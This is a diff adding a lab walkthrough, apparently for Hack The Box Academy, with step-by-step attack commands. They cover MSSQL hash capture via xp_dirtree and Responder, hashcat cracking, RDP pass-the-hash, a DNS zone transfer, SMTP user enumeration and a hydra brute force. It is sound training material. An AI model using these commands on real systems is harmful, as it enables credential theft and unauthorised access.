@@ -40,3 +40,74 @@ open new terminal where id_rsa was downloaded, then chmod 600 id_rsa
 ssh -i id_rsa jason@<Target IP>
 cat flag.txt
 
+# Attacking SQL Databases
+In Shell #1 log into the database using the given credentials
+mssqlclient.py -p 1433 htbdbuser@<Target IP>
+SELECT 1
+GO
+
+Open Shell #2
+Sudo Responder -I tun0
+
+In Shell #1
+EXEC master..xp_dirtree '\\<Attacker IP>\Share'
+GO
+
+In shell #3 -> Copy the hash into a text file
+nano hash
+<paste the hash>
+CTRL X
+Y
+<ENTER>
+hashcat -m 5600 hash rockyou.txt -> I always copy the files I need into the same folder and open the shells in that folder so I don't need to paste the whole path to the file
+Got the password: prin*****
+
+In shell #4
+mssqlclient.py -p 1433 mssqlsvc@<Target IP> -windows-auth
+enter password
+USE flagDB
+SELECT * FROM tb_flag
+
+# Attacking RDP
+For the first question simply log in with the given credentials 'htb-rdp' and 'HTBRocks!', then read the file on the desktop
+
+For the second question, don't close the RDP connection, open cmd and write: 
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+Then, simply open another Shell on your Attacker VM and connect using xfreerdp again while keeping the previous RDP connection, but this time use the following:
+xfreerdp /v:192.168.220.152 /u:<user you found in the file you needed for question 1> /pth:<hash you found in the file you needed for question 1>
+With this, you will have another RDP window opened, and you can see flag.txt on the desktop
+
+# Attacking DNS
+First enumerate the host:
+nmap -p53 -Pn -sV -sC <Target IP>
+
+Before using subdomains,add to /etc/hosts file the following:
+<Target IP> inlanefreight.htb
+
+After that, use subbrute to find out accessible subdomains:
+git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
+cd subbrute
+echo "inlanefreight.com" > ./resolvers.txt
+./subbrute.py inlanefreight.htb -> This step is very slow, take a 5 minute break :)
+*You will get a list of subdomains*
+
+use dig to transfer zones from inlanefreight.htb to one of the subdomains
+dig AXFR @inlanefreight.htb <subdomain.inlanefreight.htb>
+
+# Attacking SMTP
+*Note: You might need to restart the target machine a few times throughout the steps if the commands don't work*
+smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t <target IP> -> users.list downloaded from HTB resources
+Found user m*****@inlanefreight.htb
+
+hydra -l m*****@inlanefreight.htb -P pws.list pop3://10.129.188.160 -t 10 -> pws.list downloaded from HTB resources
+Found password p*******
+
+telnet <Target IP> 110 
+USER m*****@inlanefreight.htb
+pass p*******
+LIST
+RETR 1
+
+
+
+
